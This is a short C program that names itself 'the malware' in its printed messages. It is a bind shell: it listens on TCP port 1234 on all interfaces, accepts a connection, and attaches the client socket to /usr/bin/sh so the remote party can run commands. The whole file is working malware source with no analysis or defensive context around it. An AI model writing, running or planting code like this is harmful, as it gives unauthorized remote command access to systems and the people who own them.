#include <stdio.h>
#include <netinet/in.h> 
#include <stdlib.h> 
#include <string.h> 
#include <sys/socket.h> 
#include <sys/types.h> 
#include <sys/wait.h> 
#include <unistd.h>
#include <errno.h>

int
main(void)
{
	printf("Starting the malware\n");

	int sock_serv;
	sock_serv = socket(AF_INET, SOCK_STREAM, 0);
	if (sock_serv == -1) {
		printf("Failed to create the socket, err: %s\n", strerror(errno));
		goto _EXIT;
	}

	int res;

	int sock_opt;
	sock_opt = 1;
	res = setsockopt(sock_serv, SOL_SOCKET, SO_REUSEADDR, &sock_opt, sizeof (sock_opt));
	if (res == -1) {
		printf("Failed to set REUSEADDR option, err: %s\n", strerror(errno));
		goto _CLOSE_SOCKET;
	}

	res = setsockopt(sock_serv, SOL_SOCKET, SO_REUSEPORT, &sock_opt, sizeof (sock_opt));
	if (res == -1) {
		printf("Failed to set REUSEPORT option, err: %s\n", strerror(errno));
		goto _CLOSE_SOCKET;
	}

	struct sockaddr_in addr_serv;
	bzero(&addr_serv, sizeof (addr_serv));

	addr_serv.sin_family = AF_INET; 
	addr_serv.sin_addr.s_addr = htonl(INADDR_ANY); 
	addr_serv.sin_port = htons(1234); 

	res = bind(sock_serv, (struct sockaddr*)&addr_serv, sizeof (addr_serv));
	if (res == -1) {
		printf("Failed to bind the socket, err: %s\n", strerror(errno));
		goto _CLOSE_SOCKET;
	}

	res = listen(sock_serv, 1);
	if (res == -1) {
		printf("Failed to listen for connections, err: %s\n", strerror(errno));
		goto _CLOSE_SOCKET;
	}

	int sock_client;
	struct sockaddr_in addr_client;
	socklen_t addr_client_len;
	sock_client = accept(sock_serv, (struct sockaddr*)&addr_client, &addr_client_len);
	if (sock_client == -1) {
		printf("Failed to accept the connection, err: %s\n", strerror(errno));
		goto _CLOSE_SOCKET;
	}


	pid_t pid = vfork();
	if (pid == -1) {
		printf("Failed to create a child process, err: %s\n", strerror(errno));
		goto _CLOSE_SOCKET;
	}

	if (pid == 0) {
		res = dup2(sock_client, STDIN_FILENO);
		res = dup2(sock_client, STDERR_FILENO);
		res = dup2(sock_client, STDOUT_FILENO);

		char *args[] = { NULL };
		char *envs[] = { NULL };
		res = execve("/usr/bin/sh", args, envs);
		if (res == -1) {
			printf("Failed to create the shell, err: %s\n", strerror(errno));
		}
		_exit(EXIT_FAILURE);
	}
	
	wait(NULL);

	close(sock_client);

_CLOSE_SOCKET:
	close(sock_serv);
_EXIT:
	printf("Ending the malware\n");
	return 0;
}
